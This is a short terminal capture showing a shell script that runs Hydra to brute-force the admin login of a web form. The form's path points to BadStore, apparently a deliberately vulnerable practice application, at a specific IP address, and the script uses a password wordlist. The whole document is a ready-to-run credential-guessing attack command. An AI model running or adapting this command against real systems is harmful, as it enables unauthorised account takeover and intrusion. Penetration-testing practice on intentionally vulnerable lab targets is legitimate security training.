ec2-user@kali:~/node_launcher$ cat do_hydra.sh
#!/bin/sh
hydra 54.166.47.21 -s 80 http-post-form "/cgi-bin/badstore.cgi?action=login:email=^USER^&passwd=^PASS^:Error" -l admin -P ../hydra_passwords.txt  -V
ec2-user@kali:~/node_launcher$
